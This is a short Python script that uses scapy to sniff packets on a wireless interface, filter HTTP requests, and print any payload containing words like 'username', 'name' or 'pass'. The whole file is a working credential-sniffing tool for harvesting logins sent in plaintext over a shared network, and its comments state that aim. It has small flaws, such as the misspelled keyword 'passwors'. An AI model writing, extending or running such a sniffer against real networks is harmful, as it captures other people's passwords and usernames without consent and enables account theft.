import scapy.all as scapy
from scapy.layers import http

def sniff_packet(interfaces):
    scapy.sniff(iface=interfaces,prn=process_packet,store=False)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):#it will print every information printed through http
        if packet.haslayer(http.Raw):
            load_1 = packet[scapy.Raw].load#it will only show password asn name
            load_2 = load_1.decode("utf")
            keywords = ['username','name','pass','passwors']
            for keyword in keywords:
                if keyword in load_2:
                    print(load_2)
                    break
sniff_packet("wlan0")